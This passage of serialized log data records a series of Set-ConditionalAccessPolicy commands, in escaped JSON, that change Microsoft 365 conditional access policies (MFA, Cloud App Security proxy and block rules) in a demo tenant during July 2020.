'{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/12/2020 5:31:05 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/12/2020 5:31:05 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/13/2020 2:48:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/13/2020 2:48:09 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/13/2020 5:38:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/13/2020 5:38:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/13/2020 5:38:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/13/2020 5:38:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/14/2020 2:31:27 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/14/2020 2:31:27 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/14/2020 5:26:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/14/2020 5:26:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/15/2020 2:50:27 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/15/2020 2:50:29 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/15/2020 5:27:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/15/2020 5:27:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/16/2020 2:31:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/16/2020 2:31:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/16/2020 5:00:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/16/2020 5:00:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/16/2020 5:00:49 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/16/2020 5:00:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/17/2020 1:59:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/17/2020 1:59:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/17/2020 5:00:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/17/2020 5:00:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': 